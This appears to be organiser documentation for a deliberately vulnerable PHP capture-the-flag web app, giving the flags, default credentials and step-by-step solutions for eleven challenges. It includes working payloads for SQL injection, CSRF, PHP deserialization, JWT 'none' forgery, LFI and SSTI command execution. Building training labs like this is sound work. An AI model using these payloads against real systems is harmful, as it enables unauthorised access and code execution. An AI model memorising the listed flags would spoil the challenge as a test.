# CyberTech Solutions CTF - Red Team Challenge Documentation

## Overview
This is a deliberately vulnerable web application designed for Red Team-style CTF competitions. The challenges follow a realistic "flag at impact, not vulnerability" philosophy.

**Core Principle:** No flag lives at the vulnerability. Every flag lives at the *impact*.
Exploit → Access → Move → Flag.

---

## Tiered Flag Architecture

### Tier 1: Access Confirmation (Recon & Foothold)
Fast wins that confirm the attacker understands the attack surface.

| # | Challenge | Difficulty | Points | Flag |
|---|-----------|------------|--------|------|
| 1 | Info Disclosure | Easy | 50 | `CCEE{c0nf1g_f1l3s_4r3_tr34sur3s}` |
| 2 | HTTP Headers | Easy | 75 | `CCEE{h34d3r5_t3ll_s3cr3ts}` |

### Tier 2: Boundary Crossing (Mid Value)
These require at least one follow-up action after exploiting the vulnerability.

| # | Challenge | Difficulty | Points | Flag |
|---|-----------|------------|--------|------|
| 3 | SQL Injection | Easy | 150 | `CCEE{sql_1nj3ct10n_m4st3r}` |
| 4 | IDOR | Easy | 150 | `CCEE{1d0r_4dm1n_d4t4_3xp0s3d}` |
| 5 | CSRF | Medium | 175 | `CCEE{csrf_st4t3_ch4ng3_d3t3ct3d}` |
| 6 | Logic Flaw | Medium | 200 | `CCEE{l0g1c_fl4w_bus1n3ss_rul3s_br0k3n}` |

### Tier 3: High-Impact (Crown Jewels)
Real Red Team wins that separate strong teams.

| # | Challenge | Difficulty | Points | Flag |
|---|-----------|------------|--------|------|
| 7 | PHP Object Injection | Medium | 250 | `CCEE{c00k13_d3s3r14l1z4t10n_4dm1n_4cc3ss}` |
| 8 | JWT Vulnerabilities | Hard | 300 | `CCEE{jwt_4dm1n_s3cr3ts_unl0ck3d}` |
| 9 | LFI | Medium | 250 | `CCEE{lf1_c0nf1g_s3cr3ts_3xtr4ct3d}` |
| 10 | SSTI (Crown Jewel) | Hard | 350 | `CCEE{sst1_s3rv3r_s1d3_3x3c_cr0wn_j3w3l}` |

### Bonus Flag
| # | Challenge | Difficulty | Points | Flag |
|---|-----------|------------|--------|------|
| 11 | Admin Vault | Hard | 400 | `CCEE{4dm1n_v4ult_0wn3d}` |

**Total: 2,350 points (+ 400 bonus)**

---

## Detailed Challenge Writeups

### Tier 1 — Foothold Flags

#### 1. Information Disclosure (50 pts)
**Location:** `config.php.bak`  
**Vulnerability:** Backup configuration file accessible  
**Attack:** Download backup file, examine commented config values  
**Impact:** Accessed internal configuration data  
**Flag:** `CCEE{c0nf1g_f1l3s_4r3_tr34sur3s}`

Note: Flag is embedded in a commented variable definition, not obvious CTF marker.

---

#### 2. HTTP Headers (75 pts)
**Location:** `api/auth.php?action=debug`  
**Vulnerability:** Debug endpoint exposes sensitive header  
**Attack:** Discover the debug endpoint, inspect response headers with curl -I  
**Impact:** Inspected traffic, not just pages  
**Flag:** `CCEE{h34d3r5_t3ll_s3cr3ts}`

Command: `curl -I http://target/challenge/api/auth.php?action=debug`

---

### Tier 2 — Boundary Crossing Flags

#### 3. SQL Injection (150 pts)
**Location:** `login_legacy.php` → `internal_docs.php`  
**Vulnerability:** Unsanitized user input in SQL query  
**Payload:** `admin' OR '1'='1' --`  
**Attack Flow:**
1. Exploit SQLi to bypass authentication
2. Navigate to internal_docs.php (linked in success message)
3. Find flag in confidential memo

**Impact:** Bypassed authentication and accessed restricted content  
**Flag:** `CCEE{sql_1nj3ct10n_m4st3r}`

---

#### 4. IDOR - Insecure Direct Object Reference (150 pts)
**Location:** `view_message.php?id=1`  
**Vulnerability:** No authorization check reveals admin-only message metadata  
**Attack Flow:**
1. Enumerate message IDs (?id=1, ?id=2, etc.)
2. Discover private admin messages (access denied but metadata visible)
3. Need admin role to view full content containing flag

**Impact:** Accessed data belonging to higher-privilege user  
**Flag:** `CCEE{1d0r_4dm1n_d4t4_3xp0s3d}`

Note: Requires combining with admin access exploit (POI or JWT)

---

#### 5. CSRF - Cross-Site Request Forgery (175 pts)
**Location:** `profile.php`  
**Vulnerability:** No CSRF tokens protecting sensitive operations  
**Attack Flow:**
1. Create malicious HTML page with auto-submitting form
2. Target: password change, email update, or credit transfer
3. Trick victim into visiting malicious page
4. Reload profile.php to see flag (only appears after state change)

**Example Exploit:**
```html
<html>
<body>
<form action="http://target/challenge/profile.php" method="POST" id="csrf">
    <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

**Impact:** Forced a victim-side action  
**Flag:** `CCEE{csrf_st4t3_ch4ng3_d3t3ct3d}`

---

#### 6. Logic Flaw (200 pts)
**Location:** `shop.php`  
**Vulnerability:** No validation on quantity field (allows negative)  
**Attack Flow:**
1. Submit negative quantity on any item (e.g., quantity=-1000)
2. Gain credits instead of spending them
3. Accumulate credits until $10,000+
4. Secret "Executive Access Pass" item becomes visible
5. Purchase for $50,000 to get flag

**Impact:** Broke business rules, not just code  
**Flag:** `CCEE{l0g1c_fl4w_bus1n3ss_rul3s_br0k3n}`

---

### Tier 3 — High-Impact Flags

#### 7. PHP Object Injection (250 pts)
**Location:** `login.php` → `admin.php?file=admin_settings`  
**Vulnerability:** Unsafe `unserialize()` on user-controlled cookie  
**Attack Flow:**
1. Craft serialized `UserSession` object with `role=admin`
2. Base64 encode and set as `session_token` cookie
3. Access admin panel
4. Navigate to Settings page to find flag

**Malicious Cookie:**
```php
O:11:"UserSession":3:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";s:7:"isValid";b:1;}
// Base64: TzoxMToiVXNlclNlc3Npb24iOjM6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6NDoicm9sZSI7czo1OiJhZG1pbiI7czo3OiJpc1ZhbGlkIjtiOjE7fQ==
```

**Impact:** Forged identity and crossed trust boundary  
**Flag:** `CCEE{c00k13_d3s3r14l1z4t10n_4dm1n_4cc3ss}`

---

#### 8. JWT Vulnerabilities (300 pts)
**Location:** `api/auth.php?action=profile&secrets=true`  
**Vulnerabilities:** Algorithm confusion (accepts "none"), weak secret  
**Attack Flow:**
1. Login as guest to get JWT: `POST /api/auth.php?action=login`
2. Decode token (base64)
3. Change header algorithm to "none"
4. Change payload role to "admin"
5. Remove signature (keep trailing dot)
6. Request profile endpoint
7. Discover secrets endpoint in response
8. Request `/api/auth.php?action=profile&secrets=true`

**Forged Token:**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxMjM0NTY3ODkwfQ.
```

**Impact:** Bypassed modern auth controls  
**Flag:** `CCEE{jwt_4dm1n_s3cr3ts_unl0ck3d}`

---

#### 9. Local File Inclusion (250 pts)
**Location:** `admin.php?file=`  
**Vulnerability:** Arbitrary file inclusion via `include()`  
**Attack Flow:**
1. Gain admin access (via POI or JWT)
2. Use php://filter to read config.php source
3. Find flag in commented PHP constant

**Payload:** `?file=php://filter/convert.base64-encode/resource=includes/config`

**Impact:** Abused file inclusion to extract secrets  
**Flag:** `CCEE{lf1_c0nf1g_s3cr3ts_3xtr4ct3d}`

---

#### 10. SSTI - Server-Side Template Injection (350 pts) ★ Crown Jewel
**Location:** `newsletter.php`  
**Vulnerability:** Custom template engine uses `eval()` on `${...}` syntax  
**Attack Flow:**
1. Confirm code execution: `${7*7}` → outputs 49
2. Explore file system: `${scandir('includes/')}`
3. Discover hidden .secrets directory: `${scandir('includes/.secrets/')}`
4. Read crown jewel: `${file_get_contents('includes/.secrets/crown_jewel.dat')}`

**Advanced Payloads:**
```
${shell_exec('ls -la includes/')}
${file_get_contents('includes/.secrets/crown_jewel.dat')}
${system('cat includes/.secrets/crown_jewel.dat')}
```

**Impact:** Achieved server-side execution and accessed sensitive files  
**Flag:** `CCEE{sst1_s3rv3r_s1d3_3x3c_cr0wn_j3w3l}`

---

### Bonus — Admin Vault (400 pts)
**Location:** `admin_vault.php`  
**Prerequisite:** Admin access via PHP Object Injection OR JWT  
**Attack Flow:**
1. Gain admin access via either POI or JWT exploit
2. Navigate to Admin Vault from admin panel
3. Capture the crown jewel flag

**Impact:** Complete administrative compromise  
**Flag:** `CCEE{4dm1n_v4ult_0wn3d}`

---

## Files Structure

```
challenge/
├── index.php              # Homepage
├── about.php              # XSS vulnerability
├── services.php           # Services page
├── shop.php               # Logic flaw (secret item)
├── contact.php            # Contact form
├── careers.php            # File upload (optional)
├── login.php              # PHP Object Injection
├── login_legacy.php       # SQL Injection (grants access)
├── logout.php             # Logout handler
├── dashboard.php          # User dashboard
├── internal_docs.php      # SQLi flag location [NEW]
├── admin.php              # LFI vulnerability + admin panel
├── admin_vault.php        # Bonus flag location [NEW]
├── view_message.php       # IDOR vulnerability (admin check)
├── profile.php            # CSRF vulnerability (state change flag)
├── newsletter.php         # SSTI vulnerability (explore to find flag)
├── jwt_demo.php           # JWT testing interface
├── robots.txt             # Info disclosure hints
├── config.php.bak         # Info disclosure flag
├── api/
│   ├── auth.php           # JWT + debug endpoint (header flag)
│   ├── search.php         # Search API
│   └── scoreboard.php     # CTF scoreboard
├── includes/
│   ├── config.php         # Database config + LFI flag
│   ├── header.php         # Site header
│   ├── footer.php         # Site footer
│   ├── ssti_flag.txt      # Decoy file
│   └── .secrets/
│       └── crown_jewel.dat # SSTI crown jewel [HIDDEN]
├── exploits/
│   └── csrf_exploit.html  # Example CSRF exploit
└── css/
    └── style.css          # Site styles
```

---

## Setup Instructions

1. Build and run with Docker:
   ```bash
   docker-compose up --build
   ```

2. Access at `http://localhost:8080`

3. Default credentials:
   - Admin: `admin` / `admin123`
   - User: `john` / `password123`
   - Guest: `guest` / `guest`

4. Reset database if flags are not appearing:
   ```bash
   docker-compose down -v
   docker-compose up --build
   ```

---

## Scoring Summary

| Tier | Challenges | Points |
|------|------------|--------|
| Tier 1 (Foothold) | Info Disclosure, HTTP Headers | 125 |
| Tier 2 (Boundary) | SQLi, IDOR, CSRF, Logic Flaw | 675 |
| Tier 3 (Impact) | POI, JWT, LFI, SSTI | 1,150 |
| Bonus | Admin Vault | 400 |
| **Total** | **11 flags** | **2,350** |

---

## Why This Architecture Works

* ✅ Flags are still binary (auto-validation works)
* ✅ No subjective judging required
* ✅ No extra infrastructure needed
* ✅ Payload knowledge alone doesn't win
* ✅ Chaining matters
* ✅ Impact matters
* ✅ Decision-making matters

**This is as close as you get to real Red Team behavior inside a CTF.**

---

## Notes for Organizers

- All flags follow the format: `CCEE{...}`
- Tier 3 flags should be worth ~2x Tier 2 flags
- Consider providing hints for harder challenges
- Monitor activity_logs table for solution attempts
- The SSTI crown jewel requires actual server exploration
- IDOR flag requires combining with admin access exploit for full points
